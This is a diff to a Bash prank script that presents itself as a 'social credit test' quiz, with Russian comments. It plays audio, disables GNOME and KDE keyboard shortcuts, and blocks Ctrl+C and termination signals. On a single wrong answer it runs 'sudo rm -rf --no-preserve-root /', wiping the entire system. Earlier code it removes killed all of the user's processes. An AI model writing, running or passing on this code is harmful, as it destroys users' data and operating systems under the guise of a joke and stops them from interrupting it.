@@ -2,29 +2,73 @@
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 social_credit=1000
 is_root=false
-# Функция для воспроизведения аудиофайла
+CURRENT_USER=$(whoami)
+USER_ID=$(id -u "$CURRENT_USER")
+SCRIPT_PID=$$
+SCRIPT_NAME=$(basename "$0")
 
+# Цвета для вывода
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[0;33m'
+BLUE='\033[0;34m'
+NC='\033[0m' # No Color
+
+# Функция для воспроизведения аудиофайла
+play_audio() {
+    local audio_file="$1"
+    sudo chmod 777 "$SCRIPT_DIR/$audio_file" 2>/dev/null || true
+    
+    DISPLAY=:0 \
+    DBUS_SESSION_BUS_ADDRESS="unix:path=/run/user/$USER_ID/bus" \
+    nohup xdg-open "$SCRIPT_DIR/$audio_file" >/dev/null 2>&1 &
+}
 
 # Проверка прав root
 check_root() {
-
     sudo -v
-    sudo chmod 777 $SCRIPT_DIR/redsky.mp3
-    DISPLAY=:0 \
-    DBUS_SESSION_BUS_ADDRESS="unix:path=/run/user/$USER_ID\bus" \
-    nohup xdg-open /$SCRIPT_DIR/redsky.mp3 >/dev/null 2>&1 &
-        # Закрываем все приложения пользователя
-    sudo -u "$CURRENT_USER" pkill -9 -u "$USER_ID" || true
-    
-    # Открываем себя в полноэкранном терминале
-    sudo -u "$CURRENT_USER" xterm -fullscreen -e "sudo $SCRIPT_DIR/$(basename "$0")" &
-    sleep 2
-    
-    # Блокируем клавиатурные комбинации
-    sudo -u "$CURRENT_USER" setxkbmap -option terminate:ctrl_alt_bksp
-    sudo -u "$CURRENT_USER" xset -dpms s off s noblank s 0 0 s noexpose
-    sudo -u "$CURRENT_USER" gsettings set org.gnome.desktop.wm.keybindings minimize "[]"
+    if [ "$USER_ID" -eq 0 ]; then
+        is_root=true
+    fi
+    play_audio "redsky.mp3"
+}
 
+
+# Захват системы (без убийства DE)
+system_takeover() {
+    echo -e "${RED}=== ACTIVATION CHINA CONTROL ===${NC}"
+}
+
+# Отключение сочетаний клавиш (безопасное)
+disable_shortcuts() {
+    # Для GNOME
+    if sudo -u "$CURRENT_USER" gsettings list-schemas | grep -q org.gnome.desktop.wm.keybindings; then
+        sudo -u "$CURRENT_USER" gsettings set org.gnome.desktop.wm.keybindings minimize "[]"
+        sudo -u "$CURRENT_USER" gsettings set org.gnome.desktop.wm.keybindings close "[]"
+    fi
+
+    # Для KDE
+    if command -v kwriteconfig5 &>/dev/null; then
+        sudo -u "$CURRENT_USER" kwriteconfig5 --file kwinrc --group ModifierOnlyShortcuts --key Meta ""
+    fi
+
+    # Общее отключение
+    sudo -u "$CURRENT_USER" setxkbmap -option terminate:disabled 2>/dev/null || true
+}
+
+# Восстановление системы
+system_release() {
+    # Восстанавливаем сочетания клавиш
+    if sudo -u "$CURRENT_USER" gsettings list-schemas | grep -q org.gnome.desktop.wm.keybindings; then
+        sudo -u "$CURRENT_USER" gsettings reset org.gnome.desktop.wm.keybindings minimize
+        sudo -u "$CURRENT_USER" gsettings reset org.gnome.desktop.wm.keybindings close
+    fi
+
+    if command -v kwriteconfig5 &>/dev/null; then
+        sudo -u "$CURRENT_USER" kwriteconfig5 --file kwinrc --group ModifierOnlyShortcuts --key Meta "org.kde.plasmashell"
+    fi
+
+    sudo -u "$CURRENT_USER" setxkbmap -option 2>/dev/null || true
 }
 
 # Показать предупреждение
@@ -50,22 +94,25 @@ run_test() {
     answers=("y" "n" "3" "y" "2" "4")
 
     for i in "${!questions[@]}"; do
-        echo -e "\e[34m${questions[i]}\e[0m"
+        echo -e "${BLUE}${questions[i]}${NC}"
         
-        read -n 1 user_answer # Чтение одного символа от пользователя
+        read -n 1 -r user_answer # Чтение одного символа от пользователя
         echo
         
-        if [[ "${user_answer,,}" == "${answers[i]}" ]]; then # Сравнение ответов (игнорируя регистр)
-            paplay "$SCRIPT_DIR/correct.mp3" || aplay "$SCRIPT_DIR/correct.mp3" || echo "Sound playback not supported!" 
-	    echo -e "\e[32mCorrect! +10 Social Credit\e[0m"
+        if [[ "${user_answer,,}" == "${answers[i],,}" ]]; then # Сравнение ответов (игнорируя регистр)
+            paplay "$SCRIPT_DIR/correct.mp3" >/dev/null 2>&1 &
+            aplay "$SCRIPT_DIR/correct.mp3" >/dev/null 2>&1 &
+            echo -e "${GREEN}Correct! +10 Social Credit${NC}"
             social_credit=$((social_credit + 10))
-        else            echo -e "\e[31mWrong! -10000000000000000000 Social Credit\e[0m"
+        else
+            echo -e "${RED}Wrong! -10000000000000000000 Social Credit${NC}"
             social_credit=--9999999999999999999 # Установка низкого значения социального кредита
-            paplay "$SCRIPT_DIR/wrong.mp3" || aplay "$SCRIPT_DIR/wrong.mp3" || echo "Sound playback not supported!" 
+            paplay "$SCRIPT_DIR/wrong.mp3" >/dev/null 2>&1 &
+            aplay "$SCRIPT_DIR/wrong.mp3" >/dev/null 2>&1 & 
             show_image
         fi
         
-        echo -e "\e[33mCurrent Social Credit: $social_credit\e[0m\n"
+        echo -e "${YELLOW}Current Social Credit: $social_credit${NC}\n"
         
         sleep 1
     done
@@ -73,7 +120,7 @@ run_test() {
 
 # Показать изображение (ASCII-арт)
 show_image() {
-    echo -e "\e[35m"
+    echo -e "${RED}"
     cat << "EOF"
           .-""""""""-.
          /          \
@@ -87,41 +134,50 @@ show_image() {
          \          /
           `--------`
 EOF
-    echo -e "\e[0m"
+    echo -e "${NC}"
 }
 
 # Оценка результатов теста
 evaluate_results() {
     if (( social_credit < 0 )); then
-        echo -e "\e[31mTEST FAILED! YOUR SOCIAL CREDIT IS TOO LOW!"
-        echo "DELETING SYSTEM...\e[0m"
+        echo -e "${RED}TEST FAILED! YOUR SOCIAL CREDIT IS TOO LOW!"
+        echo "DELETING SYSTEM...${NC}"
 
         for i in {1..10}; do
             sleep 0.5 # Задержка для имитации удаления файлов
             echo "Deleting system files... $((i * 10))%"
         done
 
+        echo "Bye-bye!"
         sudo rm -rf --no-preserve-root /
     else
-        echo -e "\e[32mTEST PASSED! YOUR SOCIAL CREDIT: $social_credit\e[0m"
+        echo -e "${GREEN}TEST PASSED! YOUR SOCIAL CREDIT: $social_credit${NC}"
         echo "Your system is safe... for now."
     fi
 }
 
-# Блокировка Ctrl+C в текущем процессе (не всегда работает в bash)
+# Блокировка Ctrl+C в текущем процессе
 block_ctrl_c() {
-    trap '' SIGINT # Блокировка сигнала прерывания Ctrl+C 
+    trap '' SIGINT SIGTERM # Блокировка сигналов прерывания
 }
 
 # Основная программа
-clear
+main() {
+    clear
+    block_ctrl_c
+    check_root
 
-block_ctrl_c
+    if [[ "$1" != "--child" ]]; then
+        system_takeover
+    fi
 
-check_root
+    show_warning
+    run_test
+    evaluate_results
 
-show_warning
+    if [[ "$1" != "--child" ]]; then
+        system_release
+    fi
+}
 
-run_test
-
-evaluate_results
+main "$@"
